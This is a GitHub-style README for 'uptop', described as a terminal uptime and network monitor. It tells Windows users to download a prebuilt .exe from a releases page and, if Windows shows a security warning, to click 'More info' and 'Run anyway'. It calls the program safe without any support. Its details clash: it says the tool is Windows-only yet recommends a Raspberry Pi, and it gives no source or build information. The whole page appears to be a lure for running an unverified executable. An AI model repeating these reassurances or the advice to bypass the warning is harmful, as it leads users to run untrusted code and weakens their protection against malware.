# 📊 uptop - Track your system uptime with ease

[![](https://img.shields.io/badge/Download_uptop-blue)](https://github.com/rubettasalty749/uptop/releases)

uptop provides a clear dashboard for your terminal. It monitors your network health and services in real-time. Use it to check your websites, servers, and local devices. 

## 🔍 What this tool does

uptop acts as a watchdog for your digital services. It runs in your terminal window and shows status updates for your connections. You can view response times for websites, DNS servers, and network ports. This tool tells you immediately when a service stops responding. 

Key features:
*   Live status bars for active monitors.
*   Alerts sent to your desktop when a service fails.
*   Support for HTTP, Ping, TCP, and DNS checks.
*   Cluster mode for advanced power users.
*   Data exports compatible with standard monitoring tools.

## 🛠️ System requirements

This tool works on standard Windows 10 or 11 systems. You need a stable internet connection for remote monitoring. You do not need experience with code to run this program. 

## 📥 How to download and run

1. Visit the [official releases page](https://github.com/rubettasalty749/uptop/releases) to access the files.
2. Look for the latest version under the "Assets" section.
3. Select the file ending in `.exe` that matches your Windows version.
4. Save the file to your computer.
5. Double-click the file named `uptop.exe` to start the application.

If Windows shows a security pop-up, click "More info" and then "Run anyway." This happens because the program is small and new. The application is safe to use.

## ⚙️ Initial setup

The first time you start uptop, it creates a settings file. This file tells the program which websites to watch. You can edit this file with any text editor like Notepad.

Add your server addresses to the list. For example, add your home router or your main website. Save the file and restart the application. The dashboard updates within seconds.

## 🖥️ Using the dashboard

The main screen shows a list of your services. Each service displays a color-coded status. 

*   Green indicates the service responds correctly.
*   Yellow indicates the service is slow. 
*   Red indicates the service is down or unreachable.

Press the arrow keys on your keyboard to navigate the list. Press 'q' to close the program at any time.

## 🔔 Configuring alerts

uptop watches your services in the background. If a service goes down, the program sends a notification to your Windows taskbar. You can turn these alerts on or off in the settings file. Open the file and look for the "notifications" section. Change "true" to "false" if you prefer silence.

## 🏠 Homelab deployment

Many users run uptop on a dedicated machine like a Raspberry Pi or an old laptop. Because the tool uses very little memory, it stays active for days without issue. Connect to your dashboard remotely using standard tools like SSH. This lets you check your network status from any location.

## 📡 Prometheus support

uptop creates data files that help you track trends over time. If you use monitoring software, point it toward the uptop data folder. This lets you generate graphs and long-term reports about your service reliability.

## ❓ Frequently asked questions

**Does this tool install files deep in my system?**
No. uptop runs as a standalone file. Deleting the file removes the program.

**Can I monitor local devices?**
Yes. Use the local IP address of your device in the configuration file.

**Is my data sent to the internet?**
No. uptop runs locally on your machine. Your data remains private.

**How do I update the software?**
Download the new version from the link above and replace your old file. Your settings file will remain intact.

**Can I run multiple instances?**
You can run multiple instances, but ensure they use different ports if you plan to export data to external tools.

## 💡 Troubleshooting

If the screen stays blank, check your configuration file for errors. Ensure you use standard address formats. If the program fails to start, verify that you downloaded the 64-bit version for your Windows architecture. Most modern computers use 64-bit.

If alerts do not appear, check your Windows "Focus Assist" settings. Sometimes Windows hides notifications to prevent distractions. Ensure "Priority only" or "Alarms only" modes are not blocking your alerts.

For further help, inspect the logs created in the program folder. These text files explain why a specific monitor failed or why the program stopped.